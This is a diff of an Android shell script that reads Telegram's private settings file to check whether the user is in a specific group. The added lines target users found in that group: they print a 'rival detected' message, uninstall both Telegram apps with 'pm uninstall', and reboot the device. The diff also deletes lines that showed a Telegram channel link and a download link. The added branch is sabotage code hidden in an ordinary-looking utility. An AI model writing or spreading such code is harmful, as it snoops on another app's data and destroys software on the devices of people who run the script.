@@ -6,17 +6,13 @@ coolapk="/data/data/org.telegram.messenger.web/shared_prefs/mainconfig.xml"
 wid=$(cat $coolapk | grep '"chatPendingRequests1473718026" value="' |awk -F 'value="' '{print $2}' | sed 's/\".*$//g')
 #1473718026是群ID
 if [ "$wid" = "0" ]; then
-    echo "不适配你的手机，请勿再试，3秒后重启"
+    echo "发现同行，正在重启，请勿执行脚本，3秒后重启"
+    pm uninstall --user -0 org.telegram.messenger.web
+    pm uninstall --user -0 org.telegram.messenger
     sleep 3
     reboot
     #wid为0说明再群
 else
-    echo
-    echo 重复连续点击文字可进行复制
-    echo TG通知频道：
-    echo -e "\e[41m https://t.me/+xKnvYQlyoDQzODI9 \e[0m"
-    echo TG下载地址（使用时需要魔法VPN）：
-    echo -e "\e[41m https://telegram.org/android \e[0m"
     echo 
 fi
 #判断是否在雪花群
